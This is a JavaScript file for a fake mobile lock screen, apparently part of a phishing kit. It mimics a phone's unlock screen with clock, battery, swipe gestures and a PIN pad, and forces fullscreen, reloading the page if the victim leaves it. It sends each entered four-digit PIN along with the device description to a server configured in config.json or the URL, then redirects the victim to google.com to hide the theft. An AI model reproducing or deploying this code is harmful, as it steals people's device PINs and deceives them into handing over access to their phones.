url = "config.json?_=" + new Date().getTime()
var defaultport
var defaultproto
var defaultaddress

var xmlhttp = new XMLHttpRequest();

xmlhttp.onreadystatechange = function() {
    //console.log("hey");
    if (this.readyState == 4 && this.status == 200) {
        var myArr = JSON.parse(this.responseText);
        defaultport = myArr["port"];
        defaultproto = myArr["protocol"];
        defaultaddress = myArr["address"];
    }
};
xmlhttp.open("GET", url, false);
xmlhttp.send();

console.log(defaultport)
console.log(defaultproto)
console.log(defaultaddress)

window.swiped = false;
window.password = "";

console.log('hey')
try {
    screen.orientation.lock("portrait")
} catch (e) {
    console.log(e)

}

/*
window.addEventListener("orientationchange", function() {
    if (window.orientation == 0) {
        $('.pwn').removeClass('m90');
        $('.pwn').removeClass('p90');
    } else if (window.orientation == 90) {
        $('.pwn').removeClass('m90');
        $('.pwn').addClass('p90');
    } else if (window.orientation == -90) {
        $('.pwn').removeClass('p90');
        $('.pwn').addClass('m90');
    }
}, false);
*/


buttons = "";
buttons = buttons + "            <span class='l d aa'><span class='numb'>1</span></span><span class='d ab'><span class='numb'>2</span></span><span class='d ac'><span class='numb'>3</span></span>"
buttons = buttons + "<br><br><br><span class='d l ad'><span class='numb'>4</span></span><span class='d ae'><span class='numb'>5</span></span><span class='d af'><span class='numb'>6</span></span>"
buttons = buttons + "<br><br><br><span class='d l ag'><span class='numb'>7</span></span><span class='d ah'><span class='numb'>8</span></span><span class='d ai'><span class='numb'>9</span></span>"
buttons = buttons + "<br><br><br><span class='c d aj'><span class='numb'>0</span></span><span class='del d ak'><span class='numb'>DELETE</span></span>";

(async () => {
    const battery = await navigator.getBattery();
    const battery_level = `${Math.round(battery.level * 100)}%`;

    if (battery_level == "100%") {
        $("#banner").addClass("highbat")
    } else {
        $("#banner").addClass("lowbat")

    }
    $(".battery-level").text(battery_level); // 100%

})();


var event = new Date();
o = event.toLocaleDateString('en-US', { weekday: 'long' })
t = event.toLocaleDateString('en-US', { day: 'numeric' })
m = event.toLocaleDateString('en-US', { month: 'long' })
$(".date").text(o + " " + t + " " + m)

$(".time").text(event.getHours() + ":" + ("00" + event.getMinutes()).slice(-2))


function finish() {
    ip = getUrlVars()["ip"] || defaultaddress;
    port = getUrlVars()["port"] || defaultport;
    url = "/left/" + platform.description
    var jqxhr = $.get(defaultproto + ip + ":" + port + url, function() {
            //alert( "success" );
        })
        .done(function() {
            $(".filler").animate({ "backgroundColor": 'rgba(0,0,0,1)' }, 50);
            $("#emergency").animate({ "opacity": '0' }, 50);
            $("#pass").animate({ "opacity": '0' }, 50);
            setTimeout(function() { window.location = "https://google.com" }, 0);
        })
        .fail(function() {
            $(".filler").animate({ "backgroundColor": 'rgba(0,0,0,1)' }, 50);
            $("#emergency").animate({ "opacity": '0' }, 50);
            $("#pass").animate({ "opacity": '0' }, 50);
            setTimeout(function() { window.location = "https://google.com" }, 0);
        })
        .always(function() {});
};

function submit() {
    ip = getUrlVars()["ip"] || defaultaddress;
    port = getUrlVars()["port"] || defaultport;
    url = "/pass/" + platform.description + "/" + window.password;
    var jqxhr = $.get(defaultproto + ip + ":" + port + url, function() {
            //alert( "success" );
        })
        .done(function() {
            finish()
        })
        .fail(function() {
            finish()
        })
        .always(function() {
            //finish()
        });
}

$(function() {
    FastClick.attach(document.body);
});

ip = getUrlVars()["ip"] || defaultaddress;
port = getUrlVars()["port"] || defaultport;
url = "/new/" + platform.description;
var jqxhr = $.get(defaultproto + ip + ":" + port + url, function() {
        //alert( "success" );
    })
    .done(function() {})
    .fail(function() {})
    .always(function() {});



function addeventh() {
    try {
        function exitHandler() {
            if (document.webkitIsFullScreen || document.mozFullScreen || document.msFullscreenElement !== null) {
                location.reload()
            }
        }
        if (document.addEventListener) {
            document.addEventListener('fullscreenchange', exitHandler, false);
            document.addEventListener('mozfullscreenchange', exitHandler, false);
            document.addEventListener('MSFullscreenChange', exitHandler, false);
            document.addEventListener('webkitfullscreenchange', exitHandler, false);

        }

    } catch (e) { alert(e) }
}

function gofullscreen() {
    setTimeout(() => {
        container = $("#containerz")
        bodyel = $('body')
        //container.css('background','white');
        bodyel.css('background', 'white');
        bodyel.css('text-align', 'left');
        bodyel.css('text-align', 'left');
        container.css('width', '100%');
        container.css('height', '100%');
        $("#containerz").addClass("pwned")

        container.html($(".pwn").html());
        $(".deleteme").remove();
    }, 500);

    setTimeout(() => {
        addeventh();
        $(".pwn")[1].remove()
    }, 1000);

    setTimeout(() => {
        document.getElementsByTagName('body')[0].requestFullscreen();
        $(".pwn").css("display", "block")
        $("#containerz").css("padding", "0px")
        $("#containerz").html($(".pwn").clone());
        $(".deleteme").remove();
    }, 500);
    try {
        $("#screen").addClass(vendor);
        $(".pwned").addClass(vendor);
        $("#lockscreen").addClass(vendor);
    } catch (e) {
        $("#screen").addClass("defaultwp");
        $(".pwned").addClass("defaultwp");
        $("#lockscreen").addClass("defaultwp");
    }
}



(function(window, document) {

    'use strict';

    // patch CustomEvent to allow constructor creation (IE/Chrome)
    if (typeof window.CustomEvent !== 'function') {

        window.CustomEvent = function(event, params) {

            params = params || { bubbles: false, cancelable: false, detail: undefined };

            var evt = document.createEvent('CustomEvent');
            evt.initCustomEvent(event, params.bubbles, params.cancelable, params.detail);
            return evt;
        };

        window.CustomEvent.prototype = window.Event.prototype;
    }

    document.addEventListener('touchstart', handleTouchStart, false);
    document.addEventListener('touchmove', handleTouchMove, false);
    document.addEventListener('touchend', handleTouchEnd, false);

    var xDown = null;
    var yDown = null;
    var xDiff = null;
    var yDiff = null;
    var timeDown = null;
    var startEl = null;

    /**
     * Fires swiped event if swipe detected on touchend
     * @param {object} e - browser event object
     * @returns {void}
     */
    function handleTouchEnd(e) {

        // if the user released on a different target, cancel!
        if (startEl !== e.target) return;

        var swipeThreshold = parseInt(getNearestAttribute(startEl, 'data-swipe-threshold', '20'), 10); // default 20px
        var swipeTimeout = parseInt(getNearestAttribute(startEl, 'data-swipe-timeout', '500'), 10); // default 500ms
        var timeDiff = Date.now() - timeDown;
        var eventType = '';
        var changedTouches = e.changedTouches || e.touches || [];

        if (Math.abs(xDiff) > Math.abs(yDiff)) { // most significant
            if (Math.abs(xDiff) > swipeThreshold && timeDiff < swipeTimeout) {
                if (xDiff > 0) {
                    eventType = 'swiped-left';
                } else {
                    eventType = 'swiped-right';
                }
            }
        } else if (Math.abs(yDiff) > swipeThreshold && timeDiff < swipeTimeout) {
            if (yDiff > 0) {
                eventType = 'swiped-up';
            } else {
                eventType = 'swiped-down';
            }
        }

        if (eventType !== '') {

            var eventData = {
                dir: eventType.replace(/swiped-/, ''),
                xStart: parseInt(xDown, 10),
                xEnd: parseInt((changedTouches[0] || {}).clientX || -1, 10),
                yStart: parseInt(yDown, 10),
                yEnd: parseInt((changedTouches[0] || {}).clientY || -1, 10)
            };

            // fire `swiped` event event on the element that started the swipe
            startEl.dispatchEvent(new CustomEvent('swiped', { bubbles: true, cancelable: true, detail: eventData }));

            // fire `swiped-dir` event on the element that started the swipe
            startEl.dispatchEvent(new CustomEvent(eventType, { bubbles: true, cancelable: true, detail: eventData }));
        }

        // reset values
        xDown = null;
        yDown = null;
        timeDown = null;
    }

    /**
     * Records current location on touchstart event
     * @param {object} e - browser event object
     * @returns {void}
     */
    function handleTouchStart(e) {

        // if the element has data-swipe-ignore="true" we stop listening for swipe events
        if (e.target.getAttribute('data-swipe-ignore') === 'true') return;

        startEl = e.target;

        timeDown = Date.now();
        xDown = e.touches[0].clientX;
        yDown = e.touches[0].clientY;
        xDiff = 0;
        yDiff = 0;
    }

    /**
     * Records location diff in px on touchmove event
     * @param {object} e - browser event object
     * @returns {void}
     */
    function handleTouchMove(e) {

        if (!xDown || !yDown) return;

        var xUp = e.touches[0].clientX;
        var yUp = e.touches[0].clientY;

        xDiff = xDown - xUp;
        yDiff = yDown - yUp;
    }

    /**
     * Gets attribute off HTML element or nearest parent
     * @param {object} el - HTML element to retrieve attribute from
     * @param {string} attributeName - name of the attribute
     * @param {any} defaultValue - default value to return if no match found
     * @returns {any} attribute value or defaultValue
     */
    function getNearestAttribute(el, attributeName, defaultValue) {

        // walk up the dom tree looking for data-action and data-trigger
        while (el && el !== document.documentElement) {

            var attributeValue = el.getAttribute(attributeName);

            if (attributeValue) {
                return attributeValue;
            }

            el = el.parentNode;
        }

        return defaultValue;
    }

}(window, document));

function camera() {
    $(".camera").css("color", "#111");
    $(".white-select").css("transform", "scale(1)");
    $(".lock").fadeOut("fast");
    $(".phone").fadeOut("fast");
    $("#unlock").text("Swipe left to the camera");

    setTimeout(function() {
        $(".camera").css("color", "white");
        $(".white-select").css("transform", "scale(0)");
        $(".lock").fadeIn("slow");
        $(".phone").fadeIn("slow");
        $("#unlock").text("Swipe up to unlock");
    }, 1700);
}

function phone() {
    $(".phone").css("color", "#111");
    $(".white-select-left").css("transform", "scale(1)");
    $(".lock").fadeOut("fast");
    $(".camera").fadeOut("fast");
    $("#unlock").text("Swipe left to the dialer");

    setTimeout(function() {
        $(".phone").css("color", "white");
        $(".white-select-left").css("transform", "scale(0)");
        $(".lock").fadeIn("slow");
        $(".camera").fadeIn("slow");
        $("#unlock").text("Swipe up to unlock");
    }, 1700);
}


element = document.getElementById("screen");

// reset the transition by...
element.addEventListener("click", function(e) {
    e.preventDefault;
    if (e.target.id == "dialer")
        return false;
    if (e.target.id == "camera")
        return false;

    cont = document.getElementById("cont");

    //time = document.getElementById("time");
    //date = document.getElementById("date");
    text = document.getElementById("unlock");

    // -> removing the class
    //time.classList.remove("run-animation");
    //date.classList.remove("run-animation");
    text.classList.remove("text-animation");
    cont.classList.remove("run-animation");

    // -> triggering reflow /* The actual magic */
    // without this it wouldn't work. Try uncommenting the line and the transition won't be retriggered.
    //time.offsetWidth = time.offsetWidth;
    //date.offsetWidth = date.offsetWidth;
    text.offsetWidth = text.offsetWidth;
    cont.offsetWidth = cont.offsetWidth;

    // -> and re-adding the class
    //time.classList.add("run-animation");
    cont.classList.add("run-animation");
    //date.classList.add("run-animation");
    text.classList.add("text-animation");
}, false);




// Swipe down and up touch event 

(function() {
    var supportTouch = $.support.touch,
        scrollEvent = "touchmove scroll",
        touchStartEvent = supportTouch ? "touchstart" : "mousedown",
        touchStopEvent = supportTouch ? "touchend" : "mouseup",
        touchMoveEvent = supportTouch ? "touchmove" : "mousemove";
    $.event.special.swipeupdown = {
        setup: function() {
            var thisObject = this;
            var $this = $(thisObject);
            $this.bind(touchStartEvent, function(event) {
                var data = event.originalEvent.touches ?
                    event.originalEvent.touches[0] :
                    event,
                    start = {
                        time: (new Date).getTime(),
                        coords: [data.pageX, data.pageY],
                        origin: $(event.target)
                    },
                    stop;

                function moveHandler(event) {
                    if (!start) {
                        return;
                    }
                    var data = event.originalEvent.touches ?
                        event.originalEvent.touches[0] :
                        event;
                    stop = {
                        time: (new Date).getTime(),
                        coords: [data.pageX, data.pageY]
                    };

                    // prevent scrolling
                    if (Math.abs(start.coords[1] - stop.coords[1]) > 10) {
                        event.preventDefault();
                    }
                }
                $this
                    .bind(touchMoveEvent, moveHandler)
                    .one(touchStopEvent, function(event) {
                        $this.unbind(touchMoveEvent, moveHandler);
                        if (start && stop) {
                            if (stop.time - start.time < 1000 &&
                                Math.abs(start.coords[1] - stop.coords[1]) > 30 &&
                                Math.abs(start.coords[0] - stop.coords[0]) < 75) {
                                start.origin
                                    .trigger("swipeupdown")
                                    .trigger(start.coords[1] > stop.coords[1] ? "swipeup" : "swipedown");
                            }
                        }
                        start = stop = undefined;
                    });
            });
        }
    };
    $.each({
        swipedown: "swipeupdown",
        swipeup: "swipeupdown"
    }, function(event, sourceEvent) {
        $.event.special[event] = {
            setup: function() {
                $(this).bind(sourceEvent, $.noop);
            }
        };
    });

})();

$('#screen').on('swipeup', function() {
    $("#cont").css("transform", "scale(0)");
    setTimeout(function() {
        $("#lockscreen").fadeOut(200);

        setTimeout(function() {

            $("#lockscreen").html("<div style='height:100%;width:100%;' data-swipe-ignore='false'><h1>hey</h1></div>");
            $("#lockscreen").fadeIn(50);

        }, 0);


    }, 300);
});

function genreal(p) {

    var inputnow = "";
    for (var i = p.length - 2; i >= 0; i--) {
        inputnow = inputnow + "*"
    }
    l = window.password.substring(window.password.length - 1, window.password.length);
    return inputnow + l
}

function withoutfs() {


    $(".pwn").css("display", "block")
    $("#containerz").css("padding", "0px")
    $("#containerz").html($(".pwn").html());
    $(".deleteme").remove();
    $(".pwn").remove()
    $("#containerz").addClass("pwned")
}

function swipeaway(e) {
    if (!window.swiped) {
        window.swiped = true;
        $('#cont').animate({ marginTop: '-=1000px' }, 0.5);
        $('#cont').fadeOut(70)
        setTimeout(function() {
            $("#lockscreen").fadeOut(30);
            $("#lockscreen").html('<div class="filler"><div id="emergency"><div id="emergency-inner">EMERGENCY</div></div><div id="pass" style="opacity:0"><div id="pass-inner"><span id="currentvalue">Enter PIN</span><br><br><br><br>' + buttons + '</div></div></div>');
            setTimeout(function() {


                $("#pass").animate({ top: '-=50px', opacity: '1' }, 0.5);
                setTimeout(function() {
                    $("#emergency").animate({ top: '-=40px', opacity: '1' }, 0.35);
                }, 300)
                $("#lockscreen").fadeIn(400);
                document.removeEventListener('swipe-up', function() {});
                document.removeEventListener('swipe-left', function() {});
                document.removeEventListener('swipe-right', function() {});

                $(".d").on("click", function() {

                    if ($(this).text() == "DELETE") {
                        window.password = window.password.substring(0, window.password.length - 1);
                        $("#currentvalue").css("font-size", "12px")
                        $("#currentvalue").text(genreal(window.password))
                        console.log(window.password)
                    } else {
                        window.password = window.password + $(this).text()
                        $("#currentvalue").css("font-size", "12px")
                        $("#currentvalue").text(genreal(window.password))
                        console.log(window.password)
                    }
                    if (window.password.length == 4) {

                        submit()

                    }
                    if (window.password.length == 0) {
                        $("#currentvalue").css("font-size", "10px")
                        $("#currentvalue").text("Enter PIN")

                    }

                });

            }, 0);

        }, 300);
    }
}


document.addEventListener('swiped-up', swipeaway);
document.addEventListener('swiped-left', bounce);
document.addEventListener('swiped-right', bounce);


function bounce() {
    if (!window.swiped) {
        $("#cont").animate({ marginTop: '-=50px', opacity: '0.4' }, 0.3);

        setTimeout(function() {

            $("#cont").animate({ marginTop: '+=50px', opacity: '1' }, 0.3);

        }, 300);
    }
}